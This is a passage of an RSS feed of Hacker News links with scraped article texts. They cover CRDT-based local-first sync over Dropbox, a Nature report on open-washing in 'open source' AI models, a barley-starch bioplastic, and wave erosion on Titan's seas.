                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Local First, Forever (575 pts)]]></title>
            <link>https://tonsky.me/blog/crdt-filesync/</link>
            <guid>40786425</guid>
            <pubDate>Tue, 25 Jun 2024 09:47:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tonsky.me/blog/crdt-filesync/">https://tonsky.me/blog/crdt-filesync/</a>, See on <a href="https://news.ycombinator.com/item?id=40786425">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
        
        <p>So I was at the <a href="https://www.localfirstconf.com/" target="_blank">Local-First Conf</a> the other day, listening to <a href="https://www.youtube.com/watch?v=NMq0vncHJvU" target="_blank">Martin Kleppmann</a>, and this slide caught my attention:</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/talk.webp?t=1719240073" width="720" height="405">        </figure>
        <p>Specifically, this part:</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/talk2.webp?t=1719240073" width="720" height="550">        </figure>
        <p>But first, some context.</p>
        <h2 id="what-is-local-first">What is local-first?</h2>
        <p>For the long version, go to Ink &amp; Switch, who coined the term: <a href="https://www.inkandswitch.com/local-first/" target="_blank">www.inkandswitch.com/local-first/</a></p>
        <p>Here’s my short version:</p>
        <ul>
          <li>It’s software.</li>
          <li>That prefers keeping your data local.</li>
          <li>But it still goes to the internet occasionally to sync with other users, fetch data, back up, etc.</li>
        </ul>
        <p>If it doesn’t go to the internet at all, it’s just local software.</p>
        <p>If it doesn’t work offline with data it already has, then it’s just normal cloud software. You all know the type — sorry, Dave, I can’t play the song I just downloaded because your internet disappeared for one second...</p>
        <p>But somewhere in the middle — local-first. We love it because it’s good for the end user, you and me, not for the corporations that produce it.</p>
        <h2 id="whats-the-problem-with-local-first">What’s the problem with local-first?</h2>
        <p>The goal of local-first software is to get control back into the hands of the user, right? You own the data (literally, it’s on your device), yada-yada-yada. That part works great.</p>
        <p>However, local-first software still has this online component. For example, personal local-first software still needs to sync between your own devices. And syncing doesn’t work without a server...</p>
        <p>So here we have a problem: somebody writes local-first software. Everybody who bought it can use it until the heat death of the universe. They <em>own</em> it.</p>
        <p>But if the company goes out of business, syncing will stop working. And companies go out of business all the time.</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/bonto.webp?t=1719240073" width="720" height="375">        </figure>
        <p>What do we do?</p>
        <h2 id="cue-dropbox">Cue Dropbox</h2>
        <p>The solution is to use something widely available that will probably outlive our company. We need something popular, accessible to everyone,  has multiple implementations, and can serve as a sync server.</p>
        <p>And what’s the most common end-user application of cloud sync?</p>
        <p>Dropbox! Well, not necessarily Dropbox, but any cloud-based file-syncing solution. iCloud Drive, OneDrive, Google Drive, <a href="https://tonsky.me/blog/syncthing/">Syncthing</a>, etc.</p>
        <p>It’s perfect — many people already have it. There are multiple implementations, so if Microsoft or Apple go out of business, people can always switch to alternatives. File syncing is a commodity.</p>
        <p>But file syncing is a “dumb” protocol. You can’t “hook” into sync events, or update notifications, or conflict resolution. There isn’t much API; you just save files and they get synced. In case of conflict, best case, you get two files. Worst — you get only one :)</p>
        <p>This simplicity has an upside and a downside. The upside is: if you can work with that, it would work everywhere. That’s the interoperability part from Martin’s talk.</p>
        <p>The downside is: you can’t do much with it, and it probably won’t be optimal. But will it be enough?</p>
        <h2 id="version-1-super-naive">Version 1: Super-naive</h2>
        <p>Let’s just save our state in a file and let Dropbox sync it (in my case, I’m using Syncthing, but it’s the same idea. From now on, I’ll use “Dropbox” as a common noun).</p>
        <p>Simple:</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/naive.webp?t=1719240073" width="685" height="280">        </figure>
        <p>But what happens if you change the state on two machines? Well, you get a conflict file:</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/naive_conflict.webp?t=1719240073" width="685" height="280">        </figure>
        <p>Normally, it would’ve been a problem. But it’s not if you are using CRDT!</p>
        <blockquote>
          <p>CRDT is a collection of data types that all share a very nice property: they can always be merged. It’s not always the perfect merge, and not everything can be made into a CRDT, but IF you can put your data into a CRDT, you can be sure: all merges will go without conflicts.</p>
        </blockquote>
        <p>With CRDT, we can solve conflicts by opening both files, merging states, and saving back to <code>state.xml</code>. Simple!</p>
        <p>Even in this form, Dropbox as a common sync layer works! There are some downsides, though:</p>
        <ul>
          <li>conflicting file names are different between providers,</li>
          <li>some providers might not handle conflicts at all,</li>
          <li>it needs state-based CRDT.</li>
        </ul>
        <h2 id="version-2-a-file-per-client">Version 2: A file per client</h2>
        <p>The only way to avoid conflicts is to always edit locally. So let’s give each client its own file!</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/file_per_client.webp?t=1719240073" width="685" height="280">        </figure>
        <p>Now we just watch when files from other clients get changed and merge them with our own.</p>
        <p>And because each file is only edited on one machine, Dropbox will not report any conflicts. Any conflicts inside the data will be resolved by us via CRDT magic.</p>
        <h2 id="version-3-operations-based">Version 3: Operations-based</h2>
        <p>What if your CRDT is operation-based? Meaning, it’s easier to send operations around, not the whole state?</p>
        <p>You can always write operations into a separate append-only file. Again, each client only writes to its own, so no conflicts on the Dropbox level:</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/ops.webp?t=1719240073" width="685" height="280">        </figure>
        <p>Now, the operations log can grow quite long, and we can’t count on Dropbox to reliably and efficiently sync only parts of the file that were updated.</p>
        <p>In that case, we split operations into chunks. Less work for Dropbox to sync and less for us to catch up:</p>
        <figure>
<img src="https://tonsky.me/blog/crdt-filesync/ops_batches.webp?t=1719240073" width="685" height="280">        </figure>
        <p>You can, of course, save the position in the file to only apply operations you haven’t seen. Basic stuff.</p>
        <p>Theoretically, you should be able to do operational transformations this way, too.</p>
        <h2 id="demo">Demo</h2>
        <p>A very simple proof-of-concept demo is at <a href="https://github.com/tonsky/crdt-filesync" target="_blank">github.com/tonsky/crdt-filesync</a>.</p>
        <p>Here’s a video of it in action:</p>
        <figure>
          <video autoplay="" muted="" loop="" preload="auto" playsinline="" controls="" width="720" height="721">
            <source src="https://tonsky.me/blog/crdt-filesync/demo.mp4?t=1719240073" type="video/mp4">
          </video>
        </figure>
        <p>Under the hood, it uses Automerge for merging text edits. So it’s a proper CRDT, not just two files merging text diffs.</p>
        <h2 id="conclusion">Conclusion</h2>
        <p>If you set out to build a local-first application that users have complete control and ownership over, you need something to solve data sync.</p>
        <p>Dropbox and other file-sync services, while very basic, offer enough to implement it in a simple but working way.</p>
        <p>Sure, it won’t be as real-time as a custom solution, but it’s still better for casual syncs. Think Apple Photos: only your own photos, not real-time, but you know they will be everywhere by the end of the day. And that’s good enough!</p>
        <p>Imagine if Obsidian Sync was just “put your files in the folder” and it would give you conflict-free sync? For free? Forever? Just bring your own cloud?</p>
        <p>I’d say it sounds pretty good.</p>
        
      </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Not all 'open source' AI models are open: here's a ranking (117 pts)]]></title>
            <link>https://www.nature.com/articles/d41586-024-02012-5</link>
            <guid>40786237</guid>
            <pubDate>Tue, 25 Jun 2024 09:17:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nature.com/articles/d41586-024-02012-5">https://www.nature.com/articles/d41586-024-02012-5</a>, See on <a href="https://news.ycombinator.com/item?id=40786237">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <figure>
 <picture>
  <source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-024-02012-5/d41586-024-02012-5_27211752.jpg?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-024-02012-5/d41586-024-02012-5_27211752.jpg?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px">
  <img alt="A single open orange colored padlock surrounded by many locked green colored padlocks." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-024-02012-5/d41586-024-02012-5_27211752.jpg">
  <figcaption>
   <p><span>Truly open-source models should allow researchers to replicate and interrogate them.</span><span>Credit: MirageC/Getty</span></p>
  </figcaption>
 </picture>
</figure><p>Technology giants such as Meta and Microsoft are describing their artificial intelligence (AI) models as ‘open source’ while failing to disclose important information about the underlying technology, say researchers who analysed a host of popular chatbot models.</p><p>The definition of open source when it comes to AI models is not yet agreed, but advocates say that ’full’ openness boosts science, and is crucial for <a href="https://www.nature.com/articles/d41586-018-05707-8" data-track="click" data-label="https://www.nature.com/articles/d41586-018-05707-8" data-track-category="body text link">efforts to make AI accountable</a>. What counts as open source is likely to take on increased importance when the <a href="https://www.nature.com/articles/d41586-024-00497-8" data-track="click" data-label="https://www.nature.com/articles/d41586-024-00497-8" data-track-category="body text link">European Union’s Artificial Intelligence Act</a> comes into force. The legislation will apply less strict regulations to models that are classed as open.</p><p>Some big firms are reaping the benefits of claiming to have open-source models, while trying “to get away with disclosing as little as possible”, says Mark Dingemanse, a language scientist at Radboud University in Nijmegen, the Netherlands. This practice is known as open-washing.</p><p>“To our surprise, it was the small players, with relatively few resources, that go the extra mile,” says Dingemanse, who together with his colleague Andreas Liesenfeld, a computational linguist, created a league table that identifies the most and least open models (see table). They published their findings on 5 June in the conference proceedings of the 2024 ACM Conference on Fairness, Accountability and Transparency<sup><a href="#ref-CR1" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">1</a></sup>.</p><p>The study cuts through “a lot of the hype and fluff around the current open-sourcing debate”, says Abeba Birhane, a cognitive scientist at Trinity College Dublin and adviser on AI accountability to Mozilla Foundation, a non-profit organization based in Mountain View, California.</p><h2>Defining openness</h2><p>The term ’open source’ comes from software, where it means access to source code and no limits on a program’s use or distribution. But given the complexity of large AI models and the huge volumes of data involved, making them open source is far from straightforward, and experts are still <a href="https://opensource.org/deepdive/drafts" data-track="click" data-label="https://opensource.org/deepdive/drafts" data-track-category="body text link">working to define open-source AI</a>. Revealing all facets of a model is not always desirable for companies, because it can expose them to commercial or legal risks, says Dingemanse. Others argue that releasing models completely freely risks misuse.</p><article data-label="Related">
  <a href="https://www.nature.com/articles/d41586-024-00497-8" data-track="click" data-track-label="recommended article"><img alt="" src="https://media.nature.com/w400/magazine-assets/d41586-024-02012-5/d41586-024-02012-5_26818856.jpg"><p>What the EU’s tough AI law means for research and ChatGPT</p></a>
 </article><p>But being labelled as open source can also bring big benefits. Developers can already reap public-relations rewards from presenting themselves as rigorous and transparent. And soon there will be legal implications. The EU’s AI Act, which passed this year, will exempt open-source general-purpose models, up to a certain size, from extensive transparency requirements, and commit them to lesser and as-yet-undefined obligations. “It’s fair to say the term open source will take on unprecedented legal weight in the countries governed by the EU AI Act,” says Dingemanse.</p><p>In their study, Dingemanse and Liesenfeld assessed 40 large language models — systems that learn to generate text by making associations between words and phrases in large volumes of data. All these models claim to be ‘open source’ or ‘open’. The pair made an openness league table by assessing models on 14 parameters, including the availability of code and training data, what documentation is published and how easy the model is to access. For each parameter, they judged whether the models were open, partially open or closed.</p><p>This sliding-scale approach to analysing openness is a useful and practical one, says Amanda Brock, chief executive officer of OpenUK, a London-based not-for-profit company that focuses on open technology.</p><p>The researchers found that many models that claim to be open or open source — including Llama from Meta and Google DeepMind’s Gemma — are, in fact, just ‘open weight’. This means that outside researchers can access and use the trained models, but cannot inspect or customize them. Nor can they fully understand how they were fine-tuned for specific tasks; for example, using human feedback. “You don’t give a lot away … then you get to claim openness credits,” says Dingemanse.</p><article data-label="Related">
  <a href="https://www.nature.com/articles/d41586-023-01970-6" data-track="click" data-track-label="recommended article"><img alt="" src="https://media.nature.com/w400/magazine-assets/d41586-024-02012-5/d41586-024-02012-5_25601848.jpg"><p>Open-source AI chatbots are booming — what does this mean for researchers?</p></a>
 </article><p>Particularly worrying, say the authors, is the lack of openness about what data the models are trained on. Around half of the models that they analysed do not provide any details about data sets beyond generic descriptors, they say.</p><p>A Google spokesperson says that the company is “precise about the language” it uses to describe models, choosing to label its Gemma LLM as open rather than open source. “Existing open-source concepts can’t always be directly applied to AI systems,” they added. Microsoft tries to be “as precise as possible about what is available and to what extent”, a spokesperson says. “We choose to make artifacts like models, code, tools, and datasets publicly available because the developer and research communities have an important role to play in the advancement of AI technology.” Meta did not respond to a request for comment from <i>Nature</i>.</p><p>Models made by smaller firms and research groups tended to be more open than those of their big-tech counterparts, the analysis found. The authors highlight BLOOM, built by an international, largely academic collaboration, as an <a href="https://www.nature.com/articles/d41586-022-01705-z" data-track="click" data-label="https://www.nature.com/articles/d41586-022-01705-z" data-track-category="body text link">example of truly open-source AI</a>.</p><h2>Peer review ‘out of fashion’</h2><p>Scientific papers detailing the models are extremely rare, the pair found. Peer review seems to have “almost completely fallen out of fashion”, being replaced by blog posts with cherry-picked examples, or corporate preprints that are low on detail. Companies “might release a nice, flashy looking paper on their website, which all looks very technical. But if you pore over it, there is no specification whatsoever of what data went into that system”, says Dingemanse.</p><p>It is not yet clear how many of these models will fit the EU’s definition of open source. Under the act, this would refer to models that are released under a “free and open” licence that, for example, allows users to modify a model but says nothing about access to training data. Refining this definition will probably form “a single pressure point that will be targeted by corporate lobbies and big companies”, the paper says.</p><article data-label="Related">
  <a href="https://www.nature.com/news/can-we-open-the-black-box-of-ai-1.20731" data-track="click" data-track-label="recommended article"><img alt="" src="https://media.nature.com/w400/magazine-assets/d41586-024-02012-5/d41586-024-02012-5_27071530.jpg"><p>Can we open the black box of AI?</p></a>
 </article><p>And openness matters for science, says Dingemanse, because it is essential for reproducibility. “If you can’t reproduce it, it’s a hard sell to call it science,” he says. The only way for researchers to innovate is by tinkering with models, and to do this they need enough information to build their own versions. Not only that, but <a href="https://www.nature.com/articles/d41586-021-00530-0" data-track="click" data-label="https://www.nature.com/articles/d41586-021-00530-0" data-track-category="body text link">models must be open to scrutiny</a>. “If we cannot look inside to know how the sausage is made, we also don’t know whether to be impressed by it,” Dingemanse says. For example, it might not be an achievement for a model to pass a particular exam if it was trained on many examples of the test. And without data accountability, no one knows whether <a href="https://www.nature.com/articles/d41586-018-05707-8" data-track="click" data-label="https://www.nature.com/articles/d41586-018-05707-8" data-track-category="body text link">inappropriate or copyrighted data</a> has been used, he adds.</p><p>Liesenfeld says that the pair hope to help fellow scientists to avoid “falling into the same traps we fell into”, when looking for models to use in teaching and research.</p>
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NOFX to retire after final tour without ever having had a job (126 pts)]]></title>
            <link>https://www.nytimes.com/2024/06/18/style/nofx-farewell-tour.html</link>
            <guid>40784778</guid>
            <pubDate>Tue, 25 Jun 2024 05:23:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2024/06/18/style/nofx-farewell-tour.html">https://www.nytimes.com/2024/06/18/style/nofx-farewell-tour.html</a>, See on <a href="https://news.ycombinator.com/item?id=40784778">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2024/06/18/style/nofx-farewell-tour.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Researchers invent 100% biodegradable 'barley plastic' (204 pts)]]></title>
            <link>https://phys.org/news/2024-06-biodegradable-barley-plastic.html</link>
            <guid>40783777</guid>
            <pubDate>Tue, 25 Jun 2024 02:34:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phys.org/news/2024-06-biodegradable-barley-plastic.html">https://phys.org/news/2024-06-biodegradable-barley-plastic.html</a>, See on <a href="https://news.ycombinator.com/item?id=40783777">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/researchers-invent-100.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/researchers-invent-100.jpg" data-sub-html="Experiments on the degradation of different plastic materials. Top left is a common LDPE plastic film. Top center and right are the researchers' amylose-based bioplastic and a plastic made from corn starch, respectively. At the bottom are three different bags made from conventional bioplastics. A) shows the start of the experiment. B) shows the degradation after 8 days, C) the degradation after 11 days, D) 21 days E 41 days and F) shows the degradation after 54 days. Credit: Andreas Blennow">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/researchers-invent-100.jpg" alt="Researchers invent 100% biodegradable &quot;barley plastic&quot;" title="Experiments on the degradation of different plastic materials. Top left is a common LDPE plastic film. Top center and right are the researchers' amylose-based bioplastic and a plastic made from corn starch, respectively. At the bottom are three different bags made from conventional bioplastics. A) shows the start of the experiment. B) shows the degradation after 8 days, C) the degradation after 11 days, D) 21 days E 41 days and F) shows the degradation after 54 days. Credit: Andreas Blennow" width="800" height="423">
             <figcaption>
                Experiments on the degradation of different plastic materials. Top left is a common LDPE plastic film. Top center and right are the researchers' amylose-based bioplastic and a plastic made from corn starch, respectively. At the bottom are three different bags made from conventional bioplastics. A) shows the start of the experiment. B) shows the degradation after 8 days, C) the degradation after 11 days, D) 21 days E 41 days and F) shows the degradation after 54 days. Credit: Andreas Blennow
            </figcaption>        </figure>
    </div><p>A biofriendly new material made from barley starch blended with fiber from sugarbeet waste—a strong material that turns into compost should it end up in nature—has been created at the University of Copenhagen. In the long term, the researchers hope that their invention can help put the brakes on plastic pollution while reducing the climate footprint of plastic production.</p>


										      
																																	<p>Enormous islands of plastic float in our oceans and microscopic particles of it are in our bodies. The durability, malleability and low cost of plastics has made them ubiquitous, from packaging to clothing to aircraft parts. But plastics have a downside. Plastics contaminate nature, are tough to recycle and their production emits more CO<sub>2</sub> than all air traffic combined.</p>
<p>Now, researchers at the University of Copenhagen's Department of Plant and Environmental Sciences have invented a new material made from modified starch that can completely decompose in nature—and do so within only two months. The material is made using natural plant material from crops and could be used for food packaging, among many other things.</p>
<p>"We have an enormous problem with our plastic waste that recycling seems incapable of solving. Therefore, we've developed a new type of bioplastic that is stronger and can better withstand water than current bioplastics. At the same time, our material is 100% biodegradable and can be converted into compost by microorganisms if it ends up somewhere other than a bin," says Professor Andreas Blennow of the Department of Plant and Environmental Sciences.</p>
<p>Only about 9% of plastic is recycled globally, with the rest being either incinerated or winding up in nature or dumped into enormous plastic landfills.</p>
<p>Bioplastics already exist, but the name is misleading says Blennow. While today's bioplastics are made of bio-derived materials, only a limited part of them is actually degradable, and only under special conditions in industrial composting plants.</p>
<p>"I don't find the name suitable because the most common types of bioplastics don't break down that easily if tossed into nature. The process can take many years and some of it continues to pollute as microplastic. Specialized facilities are needed to break down bioplastics. And even then, a very limited part of them can be recycled, with the rest ending up as waste," says the researcher.</p>

																																						
																																			<h2>Starch from barley and sugar industry waste</h2>
<p>The new material is a so-called biocomposite and composed of several different substances that decompose naturally. Its main ingredients, amylose and cellulose, are common across the plant kingdom. Amylose is extracted from many crops including corn, potatoes, wheat and barley.</p>
<p>Together with researchers from Aarhus University, the research team founded a spinoff company in which they developed a barley variety that produces pure amylose in its kernels. This new variety is important because pure amylose is far less likely to turn into a paste when it interacts with water compared to regular starch.</p>
<p>Cellulose is a carbohydrate found in all plants and we know it from cotton and linen fibers, as well as from wood and paper products. The cellulose used by the researchers is a so-called nanocellulose made from local sugar industry waste. And these nanocellulose fibers, which are one thousand times smaller than the fibers of linen and cotton, are what contribute to the material's mechanical strength.</p>
<p>"Amylose and cellulose form long, strong molecular chains. Combining them has allowed us to create a durable, flexible material that has the potential to be used for shopping bags and the packaging of goods that we now wrap in plastic," says Blennow.</p>
<p>The new biomaterial is produced by either dissolving the raw materials in water and mixing them together or by heating them under pressure. By doing so, small "pellets" or chips are created that can then be processed and compressed into a desired form.</p>
<p>Thus far, the researchers have only produced prototypes in the laboratory. But according to Blennow, getting production started in Denmark and many other places in the world would be relatively easy.</p>
<p>"The entire production chain of amylose-rich starch already exists. Indeed, millions of tons of pure potato and corn starch are produced every year and used by the food industry and elsewhere. Therefore, easy access to the majority of our ingredients is guaranteed for the large-scale production of this material," he says.</p>

																																			<h2>Could reduce plastic problem</h2>
<p>Blennow and his fellow researchers are now processing a <a href="https://phys.org/tags/patent+application/" rel="tag">patent application</a> that, once it has been approved, could pave the way for production of the new biocomposite material. Because, despite the huge sums of money being devoted to sorting and recycling our plastic, the researcher does not believe that it will really be a success. Doing so should be seen as a transitional technology until we bid fossil-based plastics a final farewell.</p>
<p>"Recycling plastic efficiently is anything but straightforward. Different things in plastics must be separated from each other and there are major differences between plastic types, meaning that the process must be done in a safe way so that no contaminants end up in the <a href="https://phys.org/tags/recycled+plastic/" rel="tag">recycled plastic</a>.</p>
<p>"At the same time, countries and consumers must sort their plastic. This is a massive task that I don't see us succeeding at. Instead, we should rethink things in terms of utilizing new materials that perform like plastic, but don't pollute the planet," says Blennow.</p>
<p>The researcher is already collaborating with two Danish packaging companies to develop prototypes for food packaging, among other things. He envisions many other uses for the material as well, such as for the interior trims of cars by the automotive industry. Though it is difficult to say when this biofriendly barley-based plastic will reach the shelves, the researcher predicts that the <a href="https://phys.org/tags/new+material/" rel="tag">new material</a> may become a reality in the foreseeable future.</p>
<p>"It's quite close to the point where we can really start producing prototypes in collaboration with our research team and companies. I think it's realistic that different prototypes in soft and hard packaging, such as trays, bottles and bags, will be developed within one to five years," concludes Blennow.</p>

																																																					
																					
																					
                              										                                        
										<!-- print only -->
										<div>
											 <p><strong>Citation</strong>:
												Researchers invent 100% biodegradable 'barley plastic' (2024, June 18)
												retrieved 25 June 2024
												from https://phys.org/news/2024-06-biodegradable-barley-plastic.html
											 </p>
											 <p>
											 This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
											 part may be reproduced without the written permission. The content is provided for information purposes only.
											 </p>
										</div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wave activity on Titan strong enough to erode the coastlines of lakes and seas (138 pts)]]></title>
            <link>https://phys.org/news/2024-06-titan-strong-erode-coastlines-lakes.html</link>
            <guid>40783742</guid>
            <pubDate>Tue, 25 Jun 2024 02:29:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phys.org/news/2024-06-titan-strong-erode-coastlines-lakes.html">https://phys.org/news/2024-06-titan-strong-erode-coastlines-lakes.html</a>, See on <a href="https://news.ycombinator.com/item?id=40783742">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/researchers-find-wave.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/researchers-find-wave.jpg" data-sub-html="Processed using calibrated red, green, and blue filtered images of Titan taken by Cassini on December 16 2011. Credit: NASA/JPL-Caltech/SSI/Kevin M. Gill">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/researchers-find-wave.jpg" alt="Researchers find wave activity on Titan may be strong enough to erode the coastlines of lakes and seas" title="Processed using calibrated red, green, and blue filtered images of Titan taken by Cassini on December 16 2011. Credit: NASA/JPL-Caltech/SSI/Kevin M. Gill" width="800" height="530">
             <figcaption>
                Processed using calibrated red, green, and blue filtered images of Titan taken by Cassini on December 16 2011. Credit: NASA/JPL-Caltech/SSI/Kevin M. Gill
            </figcaption>        </figure>
    </div><p>Titan, Saturn's largest moon, is the only other planetary body in the solar system that currently hosts active rivers, lakes, and seas. These otherworldly river systems are thought to be filled with liquid methane and ethane that flows into wide lakes and seas, some as large as the Great Lakes on Earth.</p>


										      
																																	
<p>The existence of Titan's large seas and smaller lakes was confirmed in 2007, with images taken by NASA's Cassini spacecraft. Since then, scientists have pored over those and other images for clues to the moon's mysterious liquid environment.</p>
<p>Now, MIT geologists have studied Titan's shorelines and shown through simulations that the moon's large seas have likely been shaped by <a href="https://phys.org/tags/waves/" rel="tag">waves</a>. Until now, scientists have found indirect and conflicting signs of wave activity, based on remote images of Titan's surface.</p>
<p>The MIT team took a different approach to investigate the presence of waves on Titan, by first modeling the ways in which a lake can erode on Earth. They then applied their modeling to Titan's seas to determine what form of erosion could have produced the shorelines in Cassini's images. Waves, they found, were the most likely explanation.</p>
<p>The researchers emphasize that their results are not definitive; to confirm that there are waves on Titan will require direct observations of wave activity on the moon's surface.</p>
<p>"We can say, based on our results, that if the coastlines of Titan's seas have eroded, waves are the most likely culprit," says Taylor Perron, the Cecil and Ida Green Professor of Earth, Atmospheric and Planetary Sciences at MIT.</p>
<p>"If we could stand at the edge of one of Titan's seas, we might see waves of liquid methane and ethane lapping on the shore and crashing on the coasts during storms. And they would be capable of eroding the material that the coast is made of."</p>
<p>Perron and his colleagues, including first author Rose Palermo, a former MIT-WHOI Joint Program graduate student and a research geologist at the U.S. Geological Survey, <a href="https://www.science.org/doi/10.1126/sciadv.adn4192" target="_blank">published</a> their study in <i>Science Advances</i>. Their co-authors include MIT research scientist Jason Soderblom, former MIT postdoc Sam Birch, now an assistant professor at Brown University, Andrew Ashton at the Woods Hole Oceanographic Institution, and Alexander Hayes of Cornell University.</p>

																																						
																																			<h2>'Taking a different tack'</h2>
<p>The presence of waves on Titan has been a somewhat controversial topic ever since Cassini spotted bodies of liquid on the moon's surface.</p>
<p>"Some people who tried to see evidence for waves didn't see any, and said, "These seas are mirror-smooth," Palermo says. "Others said they did see some roughness on the liquid surface but weren't sure if waves caused it."</p>
<p>Knowing whether Titan's seas host wave activity could give scientists information about the moon's climate, such as the strength of the winds that could whip up such waves. Wave information could also help scientists predict how the shape of Titan's seas might evolve over time.</p>
<p>Rather than look for direct signs of wave-like features in images of Titan, Perron says the team had to "take a different tack, and see, just by looking at the shape of the shoreline, if we could tell what's been eroding the coasts."</p>
<p>Titan's seas are thought to have formed as rising levels of liquid flooded a landscape crisscrossed by river valleys. The researchers zeroed in on three scenarios for what could have happened next: no <a href="https://phys.org/tags/coastal+erosion/" rel="tag">coastal erosion</a>; erosion driven by waves; and "uniform erosion," driven either by "dissolution," in which liquid passively dissolves a coast's material, or a mechanism in which the coast gradually sloughs off under its own weight.</p>
<p>The researchers simulated how various shoreline shapes would evolve under each of the three scenarios. To simulate wave-driven erosion, they took into account a variable known as "fetch," which describes the physical distance from one point on a shoreline to the opposite side of a lake or sea.</p>

																																			<p>"Wave erosion is driven by the height and angle of the wave," Palermo explains. "We used fetch to approximate wave height because the bigger the fetch, the longer the distance over which wind can blow and waves can grow."</p>
<p>To test how shoreline shapes would differ between the three scenarios, the researchers started with a simulated sea with flooded river valleys around its edges. For wave-driven erosion, they calculated the fetch distance from every single point along the shoreline to every other point, and converted these distances to wave heights.</p>
<p>Then, they ran their simulation to see how waves would erode the starting shoreline over time. They compared this to how the same shoreline would evolve under erosion driven by uniform erosion. The team repeated this comparative modeling for hundreds of different starting shoreline shapes.</p>
<p>They found that the end shapes were very different depending on the underlying mechanism. Most notably, uniform erosion produced inflated shorelines that widened evenly all around, even in the flooded river valleys, whereas wave erosion mainly smoothed the parts of the shorelines exposed to long fetch distances, leaving the flooded valleys narrow and rough.</p>
<p>"We had the same starting shorelines, and we saw that you get a really different final shape under uniform erosion versus wave erosion," Perron says. "They all kind of look like the flying spaghetti monster because of the flooded <a href="https://phys.org/tags/river+valleys/" rel="tag">river valleys</a>, but the two types of erosion produce very different endpoints."</p>
<p>The team checked their results by comparing their simulations to actual lakes on Earth. They found the same difference in shape between Earth lakes known to have been eroded by waves and lakes affected by uniform erosion, such as dissolving limestone.</p>

																																						
																																			<h2>A shore's shape</h2>
<p>Their modeling revealed clear, characteristic <a href="https://phys.org/tags/shoreline/" rel="tag">shoreline</a> shapes, depending on the mechanism by which they evolved. The team then wondered: Where would Titan's shorelines fit, within these characteristic shapes?</p>
<p>In particular, they focused on four of Titan's largest, most well-mapped seas: Kraken Mare, which is comparable in size to the Caspian Sea; Ligeia Mare, which is larger than Lake Superior; Punga Mare, which is longer than Lake Victoria; and Ontario Lacus, which is about 20 percent the size of its terrestrial namesake.</p>
<p>The team mapped the shorelines of each Titan sea using Cassini's radar images, and then applied their modeling to each of the sea's shorelines to see which erosion mechanism best explained their shape. They found that all four seas fit solidly in the wave-driven erosion model, meaning that waves produced shorelines that most closely resembled Titan's four seas.</p>
<p>"We found that if the coastlines have eroded, their shapes are more consistent with erosion by waves than by uniform erosion or no erosion at all," Perron says.</p>
<p>The researchers are working to determine how strong Titan's winds must be in order to stir up waves that could repeatedly chip away at the coasts. They also hope to decipher, from the <a href="https://phys.org/tags/shape/" rel="tag">shape</a> of Titan's shorelines, from which directions the wind is predominantly blowing.</p>
<p>"Titan presents this case of a completely untouched system," Palermo says. "It could help us learn more fundamental things about how coasts erode without the influence of people, and maybe that can help us better manage our coastlines on Earth in the future."</p>


																																																					
																				<div>
																						<p><strong>More information:</strong>
												Rose Palermo et al, Signatures of wave erosion in Titan's coasts, <i>Science Advances</i> (2024). <a data-doi="1" href="https://dx.doi.org/10.1126/sciadv.adn4192" target="_blank">DOI: 10.1126/sciadv.adn4192</a>. <a href="https://www.science.org/doi/10.1126/sciadv.adn4192" target="_blank">www.science.org/doi/10.1126/sciadv.adn4192</a>
																						
																						</p>
																					</div>
                               											
																					
                              																					 <p>
												  
<i>This story is republished courtesy of MIT News (<a href="http://web.mit.edu/newsoffice/" target="_blank">web.mit.edu/newsoffice/</a>), a popular site that covers news about MIT research, innovation and teaching.</i>

											 </p>
										                                        
										<!-- print only -->
										<div>
											 <p><strong>Citation</strong>:
												Researchers find wave activity on Titan may be strong enough to erode the coastlines of lakes and seas (2024, June 19)
												retrieved 25 June 2024
												from https://phys.org/news/2024-06-titan-strong-erode-coastlines-lakes.html
											 </p>
											 <p>
											 This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
											 part may be reproduced without the written permission. The content is provided for information purposes only.
											 </p>
										</div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[SIMD-accelerated computer vision on a $2 microcontroller (265 pts)]]></title>
            <link>https://shraiwi.github.io/read.html?md=blog/simd-fast-esp32s3.md</link>
            <guid>40783598</guid>
            <pubDate>Tue, 25 Jun 2024 02:10:40 GMT</pubDate>
